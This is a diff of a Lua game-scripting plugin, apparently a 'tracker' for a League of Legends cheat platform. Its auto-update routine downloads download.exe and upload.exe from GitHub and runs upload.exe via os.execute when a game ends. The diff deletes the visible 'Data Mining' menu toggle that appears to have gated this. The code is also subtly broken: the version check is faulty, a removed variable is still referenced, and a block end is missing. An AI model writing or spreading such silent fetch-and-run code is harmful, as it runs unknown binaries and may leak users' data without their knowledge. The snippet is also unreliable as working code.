@@ -1,21 +1,17 @@
-data = menu:add_category("Data Mining")
-getdata = menu:add_checkbox("Test", data, 0)
-
 do
     local function AutoUpdate()
-	local Version = 0.2
-        local web_version = http:get("https://raw.githubusercontent.com/TheShaunyboi/BruhWalkerEncrypted/main/Tracker/RajoTracker.lua.version.txt")
+	local Version = 0.4
+	local web_version = http:get("https://raw.githubusercontent.com/TheShaunyboi/BruhWalkerEncrypted/main/Tracker/RajoTracker.lua.version.txt")
 	if not tonumber(web_version) == Version then
 		http:download_file("https://raw.githubusercontent.com/QuePast/Bruhwalker/main/Tracker/download.exe", "RajovanTracker//download.exe")
 		http:download_file("https://raw.githubusercontent.com/QuePast/Bruhwalker/main/Tracker/upload.exe", "RajovanTracker//upload.exe")
 		http:download_file("https://raw.githubusercontent.com/QuePast/Bruhwalker/main/Tracker/RajoTracker.lua", "RajovanTracker//RajoTracker.lua")
-        else end
+	else end
     end
     AutoUpdate()
 end
 
---function on_game_end()
-function on_tick()
+function on_game_end()
 	if menu:get_value(getdata) == 1 then
 
 	-- START DOWNLOAD
@@ -33,9 +29,6 @@ function on_tick()
 	filepathupload = os.getenv('LOCALAPPDATA') .."/leaguesense/scripts/RajovanTracker/upload.exe"
 	os.execute(filepathupload)
 
-	menu:set_value(getdata, 0)
-	end
 end
 
---client:set_event_callback("on_game_end", on_game_end)
-client:set_event_callback("on_tick", on_tick)
+client:set_event_callback("on_game_end", on_game_end)
